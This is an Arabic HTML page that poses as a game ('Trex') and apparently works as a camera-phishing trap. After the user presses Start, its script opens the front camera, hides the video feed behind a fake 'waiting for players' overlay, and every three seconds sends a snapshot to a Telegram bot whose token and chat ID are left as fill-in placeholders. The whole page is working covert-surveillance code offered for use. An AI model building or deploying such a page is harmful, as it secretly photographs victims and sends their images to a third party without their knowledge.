<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لعبة تركس – جربها الآن!</title>

<style>
body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
    color: #fff;
    height: 100vh;
    overflow: hidden;
}

#main-screen {
    height: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

h1 {
    color: #00ff88;
    text-shadow: 0 0 15px #00ff88;
    font-size: 2.8rem;
}

p {
    font-size: 1.3rem;
    text-align: center;
    max-width: 700px;
}

.btn {
    padding: 18px 60px;
    font-size: 1.6rem;
    background: #00ff88;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    box-shadow: 0 0 25px #00ff88aa;
}

#waiting-screen {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.95);
    display: none;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.loader {
    border: 10px solid #333;
    border-top: 10px solid #00ff88;
    border-radius: 50%;
    width: 90px;
    height: 90px;
    animation: spin 1.2s linear infinite;
}

@keyframes spin {
    0% {transform: rotate(0deg);}
    100% {transform: rotate(360deg);}
}

/* ===== الكاميرا المخفية ===== */
.camera-container {
    position: relative;
    width: 260px;
    height: 180px;
    margin-top: 25px;
}

/* الفيديو يعمل لكن غير مرئي */
#video {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    pointer-events: none;
}

/* النص الظاهر فقط */
.overlay-text {
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.55);
    border: 2px dashed #00ff88;
    border-radius: 12px;
    color: #00ff88;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
    font-size: 1.1rem;
    font-weight: bold;
}
</style>
</head>

<body>

<div id="main-screen">
    <h1>لعبة تركس الرائعة!</h1>
    <p>
        اضغط زر البدء للانضمام إلى اللعبة.<br>
        <strong style="color:#ff5555">تنبيه:</strong> سيتم استخدام الكاميرا بعد الموافقة.
    </p>
    <button class="btn" onclick="startGame()">ابدأ</button>
</div>

<div id="waiting-screen">
    <div class="loader"></div>

    <div class="camera-container">
        <video id="video" autoplay playsinline muted></video>
        <div class="overlay-text">
            الكاميرا مفعّلة ✔<br>
            جارٍ انتظار اللاعبين…
        </div>
    </div>
</div>

<script>
let stream;
const BOT_TOKEN = 'PUT_YOUR_BOT_TOKEN_HERE';
const CHAT_ID = 'PUT_YOUR_CHAT_ID_HERE';
const PHOTO_INTERVAL = 3000;

function startGame() {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('waiting-screen').style.display = 'flex';
    startCamera();
}

async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            setInterval(captureAndSend, PHOTO_INTERVAL);
        };
    } catch (e) {
        alert('لم يتم السماح باستخدام الكاميرا');
    }
}

async function captureAndSend() {
    const video = document.getElementById('video');
    if (video.videoWidth === 0) return;

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const blob = await new Promise(res =>
        canvas.toBlob(res, 'image/jpeg', 0.75)
    );

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}

window.addEventListener('beforeunload', () => {
    if (stream) stream.getTracks().forEach(t => t.stop());
});
</script>

</body>
</html>
